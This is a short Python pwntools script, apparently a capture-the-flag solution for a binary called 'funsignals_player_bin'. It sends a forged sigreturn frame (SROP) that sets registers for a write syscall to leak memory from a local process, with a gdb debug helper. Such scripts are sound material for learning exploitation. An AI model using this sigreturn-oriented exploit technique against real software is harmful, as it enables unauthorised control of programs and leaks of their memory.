'''
Author: Samrito
Date: 2022-03-19 16:07:42
LastEditors: Samrito
LastEditTime: 2022-03-19 16:21:35
'''
from ctypes.wintypes import tagRECT
from pwn import *

def debug(argv = ''):
    gdb.attach(io, argv)
    pause()



context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

io = process(argv=['./funsignals_player_bin'])

frame = SigreturnFrame()

debug('b * 0x10000000')

frame.rip = 0x1000000B
frame.rdi = 0x1
frame.rsi = 0x10000023
frame.rdx = 0x30
frame.rax = 0x1

io.send(bytes(frame))

io.interactive()
